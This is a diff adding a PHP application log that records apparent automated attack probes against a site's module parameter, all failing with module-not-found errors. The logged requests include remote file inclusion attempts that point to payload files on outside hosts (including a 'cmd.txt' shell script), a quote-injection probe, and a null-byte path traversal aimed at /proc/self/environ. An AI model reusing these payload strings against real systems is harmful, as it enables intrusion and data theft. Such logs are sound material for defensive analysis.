@@ -1,0 +1,30 @@
+[ 2016-03-13T02:40:20+08:00 ] 27.102.207.182 /?m=http://koreadigitalnews.com/board/data/sub_16/allnet.jpg??
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
+ERR: _MODULE_NOT_EXIST_:Http://koreadigitalnews.com/board/data/sub_16/allnet.jpg??
+
+[ 2016-03-13T02:40:22+08:00 ] 27.102.207.182 /?m=http://www.laluce-rest.co.kr/board/data/VR46.jpg??
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
+ERR: _MODULE_NOT_EXIST_:Http://www.laluce-rest.co.kr/board/data/VR46.jpg??
+
+[ 2016-03-13T05:20:39+08:00 ] 37.211.231.175 /index.php?m=Home'A=0&c=Article&a=articleCatDetail&catId=40
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
+ERR: _MODULE_NOT_EXIST_:Home'A=0
+
+[ 2016-03-13T07:58:35+08:00 ] 62.210.56.5 /index.php?m=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
+ERR: _MODULE_NOT_EXIST_:../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ00
+
+[ 2016-03-13T11:37:27+08:00 ] 200.98.129.111 /index.php?m=http://pader-g.org/templates/beez5/cmd.txt?
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000054s ]
+ERR: _MODULE_NOT_EXIST_:Http://pader-g.org/templates/beez5/cmd.txt?
+
